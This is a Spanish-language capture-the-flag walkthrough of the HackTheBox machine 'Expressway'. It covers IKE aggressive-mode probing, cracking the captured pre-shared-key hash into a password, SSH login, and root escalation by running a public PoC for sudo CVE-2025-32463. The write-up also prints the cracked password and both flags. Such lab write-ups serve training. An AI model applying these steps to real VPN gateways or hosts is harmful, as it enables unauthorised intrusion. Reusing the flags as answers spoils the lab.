---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Expressway HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 06:51 EDT
Nmap scan report for 10.10.11.87
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
```

Veremos solamente un puerto `SSH` sin ninguna web ni nada, por lo que vamos a probar a realizar un escaneo por `UDP` a ver si hay algo oculto por ahi.

```shell
nmap -sU --min-rate 1000 --top-ports 100 <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:06 EDT
Nmap scan report for 10.10.11.87
Host is up (0.033s latency).
Not shown: 94 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
500/udp   open   isakmp
515/udp   closed printer
996/udp   closed vsinet
31337/udp closed BackOrifice
49186/udp closed unknown
49201/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```

Veremos que el servicio `500` esta abierto, vamos a obtener mas informacion de dicho puerto a ver que tiene, pero de primeras ya sabemos que es un **ISAKMP (Internet Security Association and Key Management Protocol)** es usado principalmente por **VPNs IPSec**.

```shell
nmap -sU -p 500 -sV --script ike-version <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 07:08 EDT
Nmap scan report for 10.10.11.87
Host is up (0.040s latency).

PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.07 seconds
```

La caracteristicas que estamos viendo son las siguientes:

**XAUTH (Extended Authentication)** - Permite autenticación adicional **Dead Peer Detection v1.0** - Mantiene la conexión activa

Vamos a comprobar si acepta un `Aggressive Mode` realizando una peticion de esta forma:

```shell
ike-scan -A --id=test <IP>
```

Info:

```
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=6bef8cd3620d6de4) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 1.495 seconds (0.67 hosts/sec).  1 returned handshake; 0 returned notify
```

Vemos que si esta funcionando y estamos viendo informacion muy valiosa como la siguiente:

```
Encryption: 3DES
Hash: SHA1
Group: 2 (modp1024)
Auth: PSK (Pre-Shared Key)
ID Type: ID_USER_FQDN
ID Value: ike@expressway.htb
VIDs: XAUTH, Dead Peer Detection
```

Hemos descubierto un `dominio` llamado `expressway.htb`, vamos añadirlo a nuestro archivo `hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           expressway.htb
```

Lo guardamos y probamos a realizar otra peticion de esta forma para intentar capturar el `hash PSK`.

## Escalate user ike

```shell
ike-scan -A --id=expressway.htb --pskcrack=expressway.psk <IP>
```

Ahora si leemos el archivo...

> expressway.psk

```
b7a3ba72d4fe5c12243cb6ce31108c01531bc022904f66548432d5ae93aa9917e02925c4ca59c0b6270ead9d098185a54ee08bb46d3cd3b5656744f8d50f871a737858550d1eea3ddd1f4ca67b0e60bb1b18fea87a16fa99ad0b354656418000e555c7747adcb1b0d6fc79f74a7310f9789a5d1ea8384cc199d988127542bae6:51386faaab8dfba44b46fca5c217dd4901aae0183150bcbb4fca93697fefcda2f920acf2e6dd702b9f0ff27eb3adef85df40dc280edab7c177a318ca637320bf5f3d310b7b202c44224bcdb7c103b82217cc260b4622061e27dc6c375ec2036096cd26ca2e3923cdaa745cde1a0085974563843293ae11868c87a5327e2921dc:5ee610efba11daa3:843d925eeb2fb02c:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:7269395bf6d92dbf180d545a3de8c0663c691477:68fdeda0c36ce84889ff4dd1ebc259fe98b908bd47cd99abbbd1c291949e7050:f1e7585855cf7f8b9622fd9753b91b9b27e3d949
```

Vemos que lo hemos capturado de forma correcta, ahora vamos a probar a `crackearlo`.

```shell
psk-crack -d <WORDLIST> expressway.psk
```

Info:

```
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash f1e7585855cf7f8b9622fd9753b91b9b27e3d949
Ending psk-crack: 8045040 iterations in 7.548 seconds (1065888.40 iterations/sec)
```

Vemos que ha funcionado, tenemos una contraseña y tambien un usuario llamado `ike` del `dominio`, vamos a probar si funciona por `SSH`.

### SSH

```shell
ssh ike@<IP>
```

Metemos como contraseña `freakingrockstarontheroad`...

```
Last login: Wed Sep 17 10:26:26 BST 2025 from 10.10.14.77 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 23 12:31:36 2025 from 10.10.14.98
ike@expressway:~$ whoami
ike
```

Con esto veremos que ya estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
dcde31dcd467cd645bc38a6787e77e0b
```

## Escalate Privileges

Si listamos los grupos a los que pertenecemos, veremos lo siguiente:

```
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Vemos que somos del grupo `proxy`, por lo que es muy interesante, si buscamos que pertenece a dicho grupo, no veremos gran cosa.

Si vemos la version de `sudo` que hay en el sistema.

```shell
sudo -V
```

Info:

```
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Veremos que es una version vulnerable, si buscamos informacion veremos que tiene un `CVE` asociado llamado `CVE-2025-32463`, encontraremos un `exploit` en la siguiente `URL`.

[CVE-2025-32463 PoC](https://github.com/kh4sh3i/CVE-2025-32463)

Si ejecutamos dicho `exploit` de esta forma en la maquina victima:

```shell
chmod +x exploit.sh
./exploit.sh
```

Info:

```
woot!
root@expressway:/# whoami
root
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
799ac55d38a22197ceda662333d52cf4
```
